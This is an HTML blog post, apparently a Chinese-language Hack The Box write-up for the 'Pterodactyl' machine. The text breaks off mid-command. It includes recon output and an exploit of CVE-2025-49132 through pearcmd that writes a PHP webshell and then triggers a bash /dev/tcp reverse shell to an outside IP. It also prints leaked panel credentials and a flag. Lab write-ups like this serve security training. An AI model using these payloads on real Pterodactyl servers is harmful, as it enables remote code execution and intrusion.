@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/avatar-1080x1080.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/avatar-1080x1080.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/avatar-1080x1080.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="manifest" href="/manifest.json">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"l1nk.icu","root":"/","images":"/images","scheme":"Mist","darkmode":true,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="Hack The Box [Season10] Pterodactyl Linux Medium">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[Season10] Pterodactyl WP">
+<meta property="og:url" content="http://l1nk.icu/2026/02/13/Season10-Pterodactyl/index.html">
+<meta property="og:site_name" content="L1nk&#39;s Blog">
+<meta property="og:description" content="Hack The Box [Season10] Pterodactyl Linux Medium">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-02-12T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-02-12T16:00:00.000Z">
+<meta property="article:author" content="l1nk">
+<meta property="article:tag" content="blog">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://l1nk.icu/2026/02/13/Season10-Pterodactyl/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://l1nk.icu/2026/02/13/Season10-Pterodactyl/","path":"2026/02/13/Season10-Pterodactyl/","title":"[Season10] Pterodactyl WP"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>[Season10] Pterodactyl WP | L1nk's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">L1nk's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Recon"><span class="nav-number">1.</span> <span class="nav-text">Recon</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Port"><span class="nav-number">1.1.</span> <span class="nav-text">Port</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Virtual-host"><span class="nav-number">1.2.</span> <span class="nav-text">Virtual host</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-pterodactyl"><span class="nav-number">2.</span> <span class="nav-text">Web-pterodactyl</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2025-49132-%E7%BB%93%E5%90%88-PEAR-%E5%86%99-WebShell"><span class="nav-number">2.1.</span> <span class="nav-text">CVE-2025-49132 结合 PEAR 写 WebShell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2025-6018-CVE-2025-6019"><span class="nav-number">3.1.</span> <span class="nav-text">CVE-2025-6018 &amp; CVE-2025-6019</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Hash"><span class="nav-number">4.</span> <span class="nav-text">Hash</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="l1nk"
+      src="/images/avatar-1080x1080.png">
+  <p class="site-author-name" itemprop="name">l1nk</p>
+  <div class="site-description" itemprop="description">Vidar-Team Web | Student</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/kn1l" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;kn1l" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:l1nk@foxmail.com" title="E-Mail → mailto:l1nk@foxmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/l1nkowo" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;l1nkowo" rel="noopener me" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://www.kinoko.fun/" title="https:&#x2F;&#x2F;www.kinoko.fun&#x2F;" rel="noopener" target="_blank">Kinoko</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://tech.ec3o.fun/" title="https:&#x2F;&#x2F;tech.ec3o.fun&#x2F;" rel="noopener" target="_blank">Ec3o</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://www.z221x.website/" title="https:&#x2F;&#x2F;www.z221x.website&#x2F;" rel="noopener" target="_blank">z221x</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://blog.4db.icu/" title="https:&#x2F;&#x2F;blog.4db.icu&#x2F;" rel="noopener" target="_blank">Fc04dB</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://blog.naclwww.com/" title="https:&#x2F;&#x2F;blog.naclwww.com&#x2F;" rel="noopener" target="_blank">NaCl</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://blog.kiracoon.top/" title="https:&#x2F;&#x2F;blog.kiracoon.top&#x2F;" rel="noopener" target="_blank">Kiracoon</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://mysid.top/" title="https:&#x2F;&#x2F;mysid.top&#x2F;" rel="noopener" target="_blank">mysid</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://l1nk.icu/2026/02/13/Season10-Pterodactyl/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar-1080x1080.png">
+      <meta itemprop="name" content="l1nk">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L1nk's Blog">
+      <meta itemprop="description" content="Vidar-Team Web | Student">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="[Season10] Pterodactyl WP | L1nk's Blog">
+      <meta itemprop="description" content="Hack The Box [Season10] Pterodactyl Linux Medium">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [Season10] Pterodactyl WP
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-02-13 00:00:00" itemprop="dateCreated datePublished" datetime="2026-02-13T00:00:00+08:00">2026-02-13</time>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>1.2k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>4 mins.</span>
+    </span>
+</div>
+
+            <div class="post-description">Hack The Box [Season10] Pterodactyl Linux Medium</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><h3 id="Port"><a href="#Port" class="headerlink" title="Port"></a>Port</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE REASON         VERSION</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6 (protocol 2.0)</span><br><span class="line">80/tcp open  http    syn-ack ttl 63 nginx 1.21.5</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST</span><br><span class="line">|_http-server-header: nginx/1.21.5</span><br><span class="line">|_http-title: My Minecraft Server</span><br></pre></td></tr></table></figure>
+
+<h3 id="Virtual-host"><a href="#Virtual-host" class="headerlink" title="Virtual host"></a>Virtual host</h3><p>访问 web 页面可以看到能查看 <code>changelog</code>，里面有配置子域名，所以这里来跑一下 vhost</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w ~/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://pterodactyl.htb -H <span class="string">&quot;Host: FUZZ.pterodactyl.htb&quot;</span> -<span class="built_in">fc</span> 302</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://pterodactyl.htb</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /root/SecLists/Discovery/DNS/subdomains-top1million-110000.txt</span></span><br><span class="line"><span class="string"> :: Header           : Host: FUZZ.pterodactyl.htb</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string"> :: Filter           : Response status: 302</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">panel                   [Status: 200, Size: 1897, Words: 490, Lines: 36, Duration: 454ms]</span></span><br></pre></td></tr></table></figure>
+
+<p>收获一个 <code>panel.pterodactyl.htb</code></p>
+<h2 id="Web-pterodactyl"><a href="#Web-pterodactyl" class="headerlink" title="Web-pterodactyl"></a>Web-pterodactyl</h2><p><code>/changelog.txt</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">MonitorLand - CHANGELOG.txt</span><br><span class="line">======================================</span><br><span class="line"></span><br><span class="line">Version 1.20.X</span><br><span class="line"></span><br><span class="line">[Added] Main Website Deployment</span><br><span class="line">--------------------------------</span><br><span class="line">- Deployed the primary landing site for MonitorLand.</span><br><span class="line">- Implemented homepage, and link for Minecraft server.</span><br><span class="line">- Integrated site styling and dark-mode as primary.</span><br><span class="line"></span><br><span class="line">[Linked] Subdomain Configuration</span><br><span class="line">--------------------------------</span><br><span class="line">- Added DNS and reverse proxy routing for play.pterodactyl.htb.</span><br><span class="line">- Configured NGINX virtual host for subdomain forwarding.</span><br><span class="line"></span><br><span class="line">[Installed] Pterodactyl Panel v1.11.10</span><br><span class="line">--------------------------------------</span><br><span class="line">- Installed Pterodactyl Panel.</span><br><span class="line">- Configured environment:</span><br><span class="line">  - PHP with required extensions.</span><br><span class="line">  - MariaDB 11.8.3 backend.</span><br><span class="line"></span><br><span class="line">[Enhanced] PHP Capabilities</span><br><span class="line">-------------------------------------</span><br><span class="line">- Enabled PHP-FPM for smoother website handling on all domains.</span><br><span class="line">- Enabled PHP-PEAR for PHP package management.</span><br><span class="line">- Added temporary PHP debugging via phpinfo()</span><br></pre></td></tr></table></figure>
+
+<h3 id="CVE-2025-49132-结合-PEAR-写-WebShell"><a href="#CVE-2025-49132-结合-PEAR-写-WebShell" class="headerlink" title="CVE-2025-49132 结合 PEAR 写 WebShell"></a>CVE-2025-49132 结合 PEAR 写 WebShell</h3><p>漏洞原理类似于存在一个任意文件包含，而且从前面的 log 中得到 <code>Enabled PHP-PEAR for PHP package management.</code> 那我们可以考虑利用 pearcmd 进行命令执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = resources/lang/ + <span class="variable">$locale</span> + <span class="string">&#x27;/&#x27;</span> + <span class="variable">$group</span> + <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="variable">$file</span>;</span><br></pre></td></tr></table></figure>
+
+<p>尝试使用 <a target="_blank" rel="noopener" href="https://github.com/63square/CVE-2025-49132">63square&#x2F;CVE-2025-49132: PoCs for CVE-2025-49132</a> 获取了一些信息</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Target is vulnerable!</span><br><span class="line">App key: <span class="built_in">base64</span>&#123;&#123;UaThTPQnUjrrK61o&#125;&#125;+Luk7P9o4hM+gl4UiMJqcbTSThY=</span><br><span class="line"></span><br><span class="line">-- Database config --</span><br><span class="line">&#123;<span class="string">&#x27;default&#x27;</span>: <span class="string">&#x27;mysql&#x27;</span>, <span class="string">&#x27;connections&#x27;</span>: &#123;<span class="string">&#x27;mysql&#x27;</span>: &#123;<span class="string">&#x27;driver&#x27;</span>: <span class="string">&#x27;mysql&#x27;</span>, <span class="string">&#x27;url&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;host&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;port&#x27;</span>: <span class="string">&#x27;3306&#x27;</span>, <span class="string">&#x27;database&#x27;</span>: <span class="string">&#x27;panel&#x27;</span>, <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;pterodactyl&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;PteraPanel&#x27;</span>, <span class="string">&#x27;unix_socket&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;charset&#x27;</span>: <span class="string">&#x27;utf8mb4&#x27;</span>, <span class="string">&#x27;collation&#x27;</span>: <span class="string">&#x27;utf8mb4_unicode_ci&#x27;</span>, <span class="string">&#x27;prefix&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;prefix_indexes&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;timezone&#x27;</span>: <span class="string">&#x27;+00&#123;&#123;00&#125;&#125;&#x27;</span>, <span class="string">&#x27;sslmode&#x27;</span>: <span class="string">&#x27;prefer&#x27;</span>, <span class="string">&#x27;options&#x27;</span>: &#123;<span class="string">&#x27;1014&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;&#125;&#125;, <span class="string">&#x27;migrations&#x27;</span>: <span class="string">&#x27;migrations&#x27;</span>, <span class="string">&#x27;redis&#x27;</span>: &#123;<span class="string">&#x27;client&#x27;</span>: <span class="string">&#x27;predis&#x27;</span>, <span class="string">&#x27;options&#x27;</span>: &#123;<span class="string">&#x27;cluster&#x27;</span>: <span class="string">&#x27;redis&#x27;</span>, <span class="string">&#x27;prefix&#x27;</span>: <span class="string">&#x27;pterodactyl_database_&#x27;</span>&#125;, <span class="string">&#x27;default&#x27;</span>: &#123;<span class="string">&#x27;scheme&#x27;</span>: <span class="string">&#x27;tcp&#x27;</span>, <span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;/run/redis/redis.sock&#x27;</span>, <span class="string">&#x27;host&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;port&#x27;</span>: <span class="string">&#x27;6379&#x27;</span>, <span class="string">&#x27;database&#x27;</span>: <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;context&#x27;</span>: []&#125;, <span class="string">&#x27;sessions&#x27;</span>: &#123;<span class="string">&#x27;scheme&#x27;</span>: <span class="string">&#x27;tcp&#x27;</span>, <span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;/run/redis/redis.sock&#x27;</span>, <span class="string">&#x27;host&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;port&#x27;</span>: <span class="string">&#x27;6379&#x27;</span>, <span class="string">&#x27;database&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;context&#x27;</span>: []&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">-- Filesystem config --</span><br><span class="line">&#123;<span class="string">&#x27;default&#x27;</span>: <span class="string">&#x27;local&#x27;</span>, <span class="string">&#x27;disks&#x27;</span>: &#123;<span class="string">&#x27;local&#x27;</span>: &#123;<span class="string">&#x27;driver&#x27;</span>: <span class="string">&#x27;local&#x27;</span>, <span class="string">&#x27;root&#x27;</span>: <span class="string">&#x27;/var/www/pterodactyl/storage/app&#x27;</span>, <span class="string">&#x27;throw&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;, <span class="string">&#x27;public&#x27;</span>: &#123;<span class="string">&#x27;driver&#x27;</span>: <span class="string">&#x27;local&#x27;</span>, <span class="string">&#x27;root&#x27;</span>: <span class="string">&#x27;/var/www/pterodactyl/storage/app/public&#x27;</span>, <span class="string">&#x27;url&#x27;</span>: <span class="string">&#x27;http://panel.pterodactyl.htb/storage&#x27;</span>, <span class="string">&#x27;visibility&#x27;</span>: <span class="string">&#x27;public&#x27;</span>, <span class="string">&#x27;throw&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;, <span class="string">&#x27;s3&#x27;</span>: &#123;<span class="string">&#x27;driver&#x27;</span>: <span class="string">&#x27;s3&#x27;</span>, <span class="string">&#x27;key&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;secret&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;region&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;bucket&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;url&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;endpoint&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;use_path_style_endpoint&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;throw&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;&#125;, <span class="string">&#x27;links&#x27;</span>: &#123;<span class="string">&#x27;/var/www/pterodactyl/public/storage&#x27;</span>: <span class="string">&#x27;/var/www/pterodactyl/storage/app/public&#x27;</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">-- Mail config --</span><br><span class="line">&#123;<span class="string">&#x27;default&#x27;</span>: <span class="string">&#x27;smtp&#x27;</span>, <span class="string">&#x27;mailers&#x27;</span>: &#123;<span class="string">&#x27;smtp&#x27;</span>: &#123;<span class="string">&#x27;transport&#x27;</span>: <span class="string">&#x27;smtp&#x27;</span>, <span class="string">&#x27;host&#x27;</span>: <span class="string">&#x27;smtp.example.com&#x27;</span>, <span class="string">&#x27;port&#x27;</span>: <span class="string">&#x27;25&#x27;</span>, <span class="string">&#x27;encryption&#x27;</span>: <span class="string">&#x27;tls&#x27;</span>, <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;timeout&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;local_domain&#x27;</span>: <span class="string">&#x27;panel.pterodactyl.htb&#x27;</span>&#125;, <span class="string">&#x27;ses&#x27;</span>: &#123;<span class="string">&#x27;transport&#x27;</span>: <span class="string">&#x27;ses&#x27;</span>&#125;, <span class="string">&#x27;mailgun&#x27;</span>: &#123;<span class="string">&#x27;transport&#x27;</span>: <span class="string">&#x27;mailgun&#x27;</span>&#125;, <span class="string">&#x27;postmark&#x27;</span>: &#123;<span class="string">&#x27;transport&#x27;</span>: <span class="string">&#x27;postmark&#x27;</span>&#125;, <span class="string">&#x27;sendmail&#x27;</span>: &#123;<span class="string">&#x27;transport&#x27;</span>: <span class="string">&#x27;sendmail&#x27;</span>, <span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;/usr/sbin/sendmail -bs -i&#x27;</span>&#125;, <span class="string">&#x27;log&#x27;</span>: &#123;<span class="string">&#x27;transport&#x27;</span>: <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;channel&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;, <span class="string">&#x27;array&#x27;</span>: &#123;<span class="string">&#x27;transport&#x27;</span>: <span class="string">&#x27;array&#x27;</span>&#125;, <span class="string">&#x27;failover&#x27;</span>: &#123;<span class="string">&#x27;transport&#x27;</span>: <span class="string">&#x27;failover&#x27;</span>, <span class="string">&#x27;mailers&#x27;</span>: [<span class="string">&#x27;smtp&#x27;</span>, <span class="string">&#x27;log&#x27;</span>]&#125;&#125;, <span class="string">&#x27;from&#x27;</span>: &#123;<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;no-reply@example.com&#x27;</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Pterodactyl Panel&#x27;</span>&#125;, <span class="string">&#x27;markdown&#x27;</span>: &#123;<span class="string">&#x27;theme&#x27;</span>: <span class="string">&#x27;default&#x27;</span>, <span class="string">&#x27;paths&#x27;</span>: [<span class="string">&#x27;/var/www/pterodactyl/resources/views/vendor/mail&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>让 AI 生成字典 FUZZ 以后，得到 <code>pearcmd.php</code> 位于 <code>/usr/share/php/PEAR</code> 目录下</p>
+<p>写个 webshell 然后反弹 shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/locales/locale.json?+config-create+/&amp;locale=../../../../../../usr/share/php/PEAR&amp;namespace=pearcmd&amp;/&lt;?=system($_GET[&#x27;cmd&#x27;]);?&gt;+/tmp/payload.php </span><br><span class="line"></span><br><span class="line">/locales/locale.json?&amp;locale=../../../../../../tmp&amp;namespace=payload&amp;cmd=bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E10%2E16%2E62%2F6666%200%3E%261</span><br></pre></td></tr></table></figure>
+
+<p>拿到 user.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /home/phileasfogg3/user.txt</span><br><span class="line">bdf11038c28774f26e024601d0333772</span><br></pre></td></tr></table></figure>
+
+<p>查看一下数据库中有没有账号信息，先枚举表名</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">mysql -u 